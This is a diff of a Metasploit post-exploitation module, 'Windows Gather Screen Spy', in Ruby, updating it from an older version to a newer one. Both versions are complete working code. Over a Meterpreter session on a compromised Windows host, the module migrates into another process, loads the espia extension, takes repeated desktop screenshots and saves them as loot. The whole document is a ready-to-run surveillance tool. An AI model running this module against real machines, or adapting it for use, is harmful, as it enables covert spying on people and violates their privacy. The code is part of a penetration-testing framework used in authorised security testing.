@@ -1,120 +1,138 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
-
-require 'msf/core'
 require 'rbconfig'
 
-class Metasploit3 < Msf::Post
-	def initialize(info={})
-		super( update_info(info,
-			'Name'           => 'Windows Gather Screen Spy',
-			'Description'    => %q{
-					This module will incrementally take screenshots of the meterpreter host. This
-				allows for screen spying which can be useful to determine if there is an active
-				user on a machine, or to record the screen for later data extraction.
-				},
-			'License'        => MSF_LICENSE,
-			'Author'         =>
-				[
-					'Roni Bachar <roni.bachar.blog[at]gmail.com>', # original meterpreter script
-					'bannedit', # post module
-					'kernelsmith <kernelsmith /x40 kernelsmith /x2E com>', # record support
-					'Adrian Kubok' # better record file names
-				],
-			'Version'        => '$Revision$',
-			'Platform'       => ['windows'],
-			'SessionTypes'   => ['meterpreter']
-		))
+class MetasploitModule < Msf::Post
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Screen Spy',
+        'Description' => %q{
+          This module will incrementally take desktop screenshots from the host. This
+          allows for screen spying which can be useful to determine if there is an active
+          user on a machine, or to record the screen for later data extraction.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Roni Bachar <roni.bachar.blog[at]gmail.com>', # original meterpreter script
+          'bannedit', # post module
+          'kernelsmith <kernelsmith /x40 kernelsmith /x2E com>', # record/loot support, log x approach, nx
+          'Adrian Kubok', # better record file names
+          'DLL_Cool_J' # Specify PID to migrate into
+        ],
+        'Platform' => ['win'], # @todo add support for posix meterpreter somehow?
+        'SessionTypes' => ['meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => []
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_migrate
+            ]
+          }
+        }
+      )
+    )
 
-		register_options(
-			[
-				OptInt.new('DELAY', [false, 'Interval between screenshots in seconds', 5]),
-				OptInt.new('COUNT', [false, 'Number of screenshots to collect', 60]),
-				OptString.new('BROWSER', [false, 'Browser to use for viewing screenshots', 'firefox']),
-				OptBool.new('RECORD', [false, 'Record all screenshots to disk',false])
-			], self.class)
-	end
+    register_options([
+      OptInt.new('DELAY', [true, 'Interval between screenshots in seconds', 5]),
+      OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),
+      OptBool.new('VIEW_SCREENSHOTS', [false, 'View screenshots automatically', false]),
+      OptBool.new('RECORD', [true, 'Record all screenshots to disk by saving them to loot', true]),
+      OptString.new('PID', [false, 'PID to migrate into before taking the screenshots', ''])
+    ])
+  end
 
-	def run
-		host = session.session_host
-		screenshot = Msf::Config.install_root + "/data/" + host + ".jpg"
+  def view_screenshots?
+    datastore['VIEW_SCREENSHOTS']
+  end
 
-		migrate_explorer
-		if session.platform !~ /win32|win64/i
-			print_error("Unsupported Platform")
-			return
-		end
+  def record?
+    datastore['RECORD']
+  end
 
-		begin
-			session.core.use("espia")
-		rescue ::Exception => e
-			print_error("Failed to load espia extension (#{e.to_s})")
-			return
-		end
+  def run
+    fail_with(Failure::BadConfig, "Unsupported platform #{session.platform}") unless session.platform == 'windows'
 
-		# here we check for the local platform and use default browsers
-		# linux is the one question mark firefox is not necessarily a
-		case ::Config::CONFIG['host'] # neat trick to get the local system platform
-		when /ming/
-			cmd = "start #{datastore['BROWSER']} \"file://#{screenshot}\""
-		when /linux/
-			cmd = "#{datastore['BROWSER']} file://#{screenshot}"
-		when /apple/
-			cmd = "open file://#{screenshot}" # this will use preview
-		end
+    migrate(datastore['PID'].to_i) unless datastore['PID'].blank?
 
-		begin
-			count = datastore['COUNT']
-			print_status "Capturing %u screenshots with a delay of %u seconds" % [count, datastore['DELAY']]
-			# calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
-			leading_zeros = Math::log(count,10).round
-			count.times do |num|
-				select(nil, nil, nil, datastore['DELAY'])
-				data = session.espia.espia_image_get_dev_screen
-				if data
-					if datastore['RECORD']
-						# let's write it to disk using non-clobbering filename
-						shot = Msf::Config.install_root + "/data/" + host + ".screenshot.%0#{leading_zeros}d.jpg" % num
-						ss = ::File.new(shot, 'wb')
-						ss.write(data)
-						ss.close
-					end
+    begin
+      session.core.use('espia')
+    rescue StandardError => e
+      fail_with(Failure::Unknown, "Failed to load espia extension (#{e})")
+    end
 
-					fd = ::File.new(screenshot, 'wb')
-					fd.write(data)
-					fd.close
-				end
-				system(cmd)
-			end
-		rescue ::Exception => e
-			print_error("Error taking screenshot: #{e.class} #{e} #{e.backtrace}")
-			return
-		end
-		print_status("Screen Spying Complete")
-		::File.delete(screenshot)
-	end
+    count = datastore['COUNT']
+    print_status("Capturing #{count} screenshots with a delay of #{datastore['DELAY']} seconds")
 
-	def migrate_explorer
-		pid = session.sys.process.getpid
-		session.sys.process.get_processes.each do |p|
-			if p['name'] == 'explorer.exe' and p['pid'] != pid
-				print_status("Migrating to explorer.exe pid: #{p['pid']}")
-				begin
-					session.core.migrate(p['pid'].to_i)
-					print_status("Migration successful")
-				rescue
-					print_status("Migration failed.")
-					return
-				end
-			end
-		end
-	end
+    begin
+      # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
+      leading_zeros = Math.log10(count).round
+      file_locations = []
+      count.times do |num|
+        select(nil, nil, nil, datastore['DELAY'])
+
+        begin
+          data = session.espia.espia_image_get_dev_screen
+        rescue Rex::Post::Meterpreter::RequestError => e
+          fail_with(Failure::Unknown, "Error taking the screenshot: #{e.class} #{e} #{e.backtrace}")
+        end
+
+        unless data
+          print_error('No screenshot data')
+          next
+        end
+
+        if record?
+          # let's loot it using non-clobbering filename, even though this is the source filename, not dest
+          fn = "screenshot.%0#{leading_zeros}d.jpg" % num
+          file_locations << store_loot('screenspy.screenshot', 'image/jpg', session, data, fn, 'Screenshot')
+        end
+
+        # also write to disk temporarily so we can display in browser.
+        # They may or may not have been RECORDed.
+        # do this if they have not suppressed VIEW_SCREENSHOT display
+        next unless view_screenshots?
+
+        screenshot = Rex::Quickfile.new("#{session.session_host}-screenshot.jpg")
+        screenshot.write(data)
+        screenshot.close
+        Rex::Compat.open_browser("file://#{screenshot.path}")
+      end
+    rescue IOError, Errno::ENOENT => e
+      fail_with(Failure::Unknown, "Error storing screenshot: #{e.class} #{e} #{e.backtrace}")
+    end
+
+    print_status('Screen Spying Complete')
+    if record? && framework.db.active && !file_locations.empty?
+      print_status('run loot -t screenspy.screenshot to see file locations of your newly acquired loot')
+    end
+
+    if view_screenshots?
+      # wait 2 secs so the last file can get opened before deletion
+      sleep(2)
+      vprint_status("Deleting temporary screenshot file: #{screenshot.path}")
+      begin
+        ::File.delete(screenshot.path)
+      rescue StandardError => e
+        print_error("Error deleting the temporary screenshot file: #{e.class} #{e} #{e.backtrace}")
+        print_error('This may be due to the file being in use if you are on a Windows platform')
+      end
+    end
+  end
+
+  def migrate(pid)
+    session.core.migrate(pid)
+    print_good("Migration to #{pid} successful")
+    pid
+  rescue StandardError
+    fail_with(Failure::Unknown, 'Migration failed! Unable to take a screenshot under the desired process!')
+  end
 end
